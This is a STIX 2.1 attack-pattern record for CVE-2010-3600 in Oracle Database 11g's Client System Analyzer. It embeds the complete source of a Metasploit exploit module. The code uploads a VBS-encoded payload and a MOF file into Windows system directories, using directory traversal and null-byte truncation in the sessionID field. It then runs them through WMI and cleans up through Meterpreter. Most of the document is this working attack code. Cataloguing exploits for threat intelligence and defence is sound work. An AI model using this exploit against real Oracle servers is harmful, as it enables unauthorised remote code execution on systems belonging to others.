{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--99ec35a6-5a67-493e-b282-0093b84991a5",
    "created": "2024-08-14T16:50:22.788553Z",
    "modified": "2024-08-14T16:50:22.788557Z",
    "name": "Oracle Database Client System Analyzer Arbitrary File Upload",
    "description": " This module exploits an arbitrary file upload vulnerability on the Client Analyzer component as included in Oracle Database 11g, which allows remote attackers to upload and execute arbitrary code. This module has been tested successfully on Oracle Database 11g 11.2.0.1.0 on Windows 2003 SP2, where execution through the Windows Management Instrumentation service has been used. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/oracle/client_system_analyzer_upload.rb",
            "external_id": "client_system_analyzer_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3600"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Oracle Containers for J2EE/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Oracle Database Client System Analyzer Arbitrary File Upload',\n        'Description' => %q{\n          This module exploits an arbitrary file upload vulnerability on the Client\n          Analyzer component as included in Oracle Database 11g, which allows remote\n          attackers to upload and execute arbitrary code. This module has been tested\n          successfully on Oracle Database 11g 11.2.0.1.0 on Windows 2003 SP2, where execution\n          through the Windows Management Instrumentation service has been used.\n        },\n        'Author' => [\n          '1c239c43f521145fa8385d64a9c32243', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => [ 'win' ],\n        'Privileged' => true,\n        'References' => [\n          [ 'CVE', '2010-3600' ],\n          [ 'OSVDB', '70546'],\n          [ 'BID', '45883'],\n          [ 'ZDI', '11-018' ],\n          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html' ]\n        ],\n        'Targets' => [\n          [ 'Oracle Oracle11g 11.2.0.1.0 / Windows 2003 SP2', {} ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2011-01-18',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(1158),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptInt.new('DEPTH', [true, 'Traversal depth to reach the root', 13])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session(client)\n    return if not @var_mof_name\n    return if not @var_vbs_name\n\n    vbs_path = \"C:\\\\windows\\\\system32\\\\#{@var_vbs_name}.vbs\"\n    mof_path = \"C:\\\\windows\\\\system32\\\\wbem\\\\mof\\\\good\\\\#{@var_mof_name}.mof\"\n\n    if client.type != \"meterpreter\"\n      print_error(\"NOTE: you must use a meterpreter payload in order to automatically cleanup.\")\n      print_error(\"The vbs payload (#{vbs_path}) and mof file (#{mof_path}) must be removed manually.\")\n      return\n    end\n\n    # stdapi must be loaded before we can use fs.file\n    client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n\n    attrib_path = \"C:\\\\windows\\\\system32\\\\attrib.exe -r \"\n\n    cmd = attrib_path + mof_path\n\n    client.sys.process.execute(cmd, nil, { 'Hidden' => true })\n\n    begin\n      print_warning(\"Deleting the vbs payload \\\"#{@var_vbs_name}.vbs\\\" ...\")\n      client.fs.file.rm(vbs_path)\n      print_warning(\"Deleting the mof file \\\"#{@var_mof_name}.mof\\\" ...\")\n      client.fs.file.rm(mof_path)\n    rescue ::Exception => e\n      print_error(\"Exception: #{e.inspect}\")\n    end\n  end\n\n  def upload_file(data)\n    res = send_request_cgi(\n      {\n        'uri' => '/em/ecm/csa/v10103/CSAr.jsp',\n        'method' => 'POST',\n        'data' => data\n      }\n    )\n\n    return res\n  end\n\n  def check\n    file_name = rand_text_alpha(rand(5) + 5)\n    file_contents = rand_text_alpha(rand(20) + 20)\n\n    data = \"sessionID=#{file_name}.txt\\x00.xml\"\n    data << \"\\x0d\\x0a\"\n    data << Rex::Text.uri_encode(file_contents)\n\n    print_status(\"Uploading the CSA#{file_name}.txt file\")\n    res = upload_file(data)\n    if not res or res.code != 200 or (res.body !~ /posted data was written to placeholder file/ and res.body !~ /csaPostStatus=0/)\n      vprint_error(\"The test file could not be uploaded\")\n      return Exploit::CheckCode::Safe\n    end\n\n    print_status(\"Checking uploaded contents...\")\n    res = send_request_raw({ 'uri' => \"/em/CSA#{file_name}.txt\" })\n\n    if res and res.code == 200 and res.body =~ /#{file_contents}/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    # In order to save binary data to the file system the payload is written to a .vbs\n    # file and execute it from there.\n    @var_mof_name = rand_text_alpha(rand(5) + 5)\n    @var_vbs_name = rand_text_alpha(rand(5) + 5)\n\n    print_status(\"Encoding payload into vbs...\")\n    # Only 100KB can be uploaded by default, because of this \"to_win32pe_old\" is used,\n    # the \"new\" template is too big in this case.\n    exe = Msf::Util::EXE.to_win32pe_old(framework, payload.encoded)\n    # The payload is embedded in a vbs and executed from there to avoid badchars that\n    # URLDecoder.decode (jsp) is unable to decode correctly such as 0x81, 0x8d, 0x8f,\n    # 0x90 and 0x9d\n    vbs = Msf::Util::EXE.to_exe_vbs(exe)\n\n    print_status(\"Generating mof file...\")\n    mof_content = generate_mof(\"#{@var_mof_name}.mof\", \"#{@var_vbs_name}.vbs\")\n\n    traversal = \"..\\\\\" * datastore['DEPTH']\n    data = \"sessionID=#{traversal}\\\\WINDOWS\\\\system32\\\\#{@var_vbs_name}.vbs\\x00.xml\"\n    data << \"\\x0d\\x0a\"\n    # The data to upload must be uri encoded because the vulnerable jsp will use\n    # URLDecoder.decode on it before writting to file.\n    data << Rex::Text.uri_encode(vbs)\n    print_status(\"Uploading the payload into the VBS to c:\\\\WINDOWS\\\\system32\\\\#{@var_vbs_name}.vbs...\")\n    res = upload_file(data)\n    if not res or res.code != 200 or (res.body !~ /posted data was written to placeholder file/ and res.body !~ /csaPostStatus=0/)\n      fail_with(Failure::Unknown, 'VBS upload failed')\n    end\n\n    data = \"sessionID=#{traversal}WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{@var_mof_name}.mof\\x00.xml\"\n    data << \"\\x0d\\x0a\"\n    data << Rex::Text.uri_encode(mof_content)\n    print_status(\"Uploading the mof file to c:\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{@var_mof_name}.mof...\")\n    res = upload_file(data)\n    if not res or res.code != 200 or (res.body !~ /posted data was written to placeholder file/ and res.body !~ /csaPostStatus=0/)\n      fail_with(Failure::Unknown, 'MOF upload failed')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-01-18",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}